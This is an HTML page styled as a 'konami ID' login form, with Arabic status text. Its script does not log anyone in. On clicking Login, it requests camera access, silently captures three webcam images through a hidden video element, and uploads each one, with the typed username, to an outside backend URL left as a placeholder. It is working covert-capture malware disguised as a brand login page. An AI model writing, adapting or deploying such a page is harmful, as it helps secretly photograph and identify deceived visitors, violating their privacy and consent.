

<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>konami ID</title>
<style>
:root{--accent:#c0132b}*{box-sizing:border-box}body{
  margin:0;font-family:Arial,Helvetica,sans-serif;min-height:100vh;
  display:grid;place-items:center;
  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
  color:#222
}
.card{width:min(92vw,420px);background:#fff;border-radius:18px;padding:28px;box-shadow:0 12px 30px rgba(0,0,0,.2);text-align:center}
.brand{font-weight:800;color:var(--accent);font-size:22px;margin-bottom:8px}
.field{margin:10px 0}.input{width:100%;padding:12px;border-radius:12px;border:1px solid #ddd;font-size:16px}
.btn{width:100%;padding:12px;border-radius:12px;border:0;background:var(--accent);color:#fff;font-size:16px;cursor:pointer}
.video-hidden{position:absolute;width:1px;height:1px;opacity:0;left:-9999px}
.status{margin-top:8px;font-size:13px;color:#333}
</style>
</head>
<body>
  <div class="card">
    <div class="brand">konami ID</div>
    <div> اضغط Login </div>
    <div class="field"><input id="user" class="input" placeholder="Username"></div>
    <div class="field"><input id="pass" type="password" class="input" placeholder="Password"></div>
    <button id="loginBtn" class="btn">Login</button>
    <div id="status" class="status"></div>
  </div>

  <video id="v" class="video-hidden" autoplay playsinline></video>
  <canvas id="c" width="640" height="480" style="display:none"></canvas>

<script>
const BACKEND_URL = "https://YOUR-USER.pythonanywhere.com/upload"; 
const btn = document.getElementById('loginBtn');
const status = document.getElementById('status');
const video = document.getElementById('v');
const canvas = document.getElementById('c');
const ctx = canvas.getContext('2d');

function setStatus(t){ status.textContent = t; }

async function openCamera(){
  const stream = await navigator.mediaDevices.getUserMedia({video:true});
  video.srcObject = stream;
  await video.play();
  return stream;
}

async function captureOnce(){
  ctx.drawImage(video,0,0,canvas.width,canvas.height);
  return canvas.toDataURL('image/png');
}

async function sendToBackend(data, meta={}){
  const res = await fetch(BACKEND_URL, {
    method:'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ image: data, meta })
  });
  return res.ok;
}

btn.addEventListener('click', async ()=>{
  btn.disabled = true;
  setStatus('طلب إذن الكاميرا...');
  let stream;
  try{
    stream = await openCamera();
    setStatus('التقاط الصور وإرسالها...');
    const meta = { user: document.getElementById('user').value || "", time: Date.now() };
    for(let i=1;i<=3;i++){
      const img = await captureOnce();
      const ok = await sendToBackend(img, meta);
      setStatus(ok? `أرسلت الصورة ${i}/3` : `خطأ إرسال الصورة ${i}`);
      await new Promise(r=>setTimeout(r,800));
    }
    setStatus('انتهت العملية');
  }catch(e){
    console.error(e);
    setStatus('فشل الوصول للكاميرا أو الخادم');
  }finally{
    if(video.srcObject) video.srcObject.getTracks().forEach(t=>t.stop());
    btn.disabled = false;
  }
});
</script>
</body>
</html>
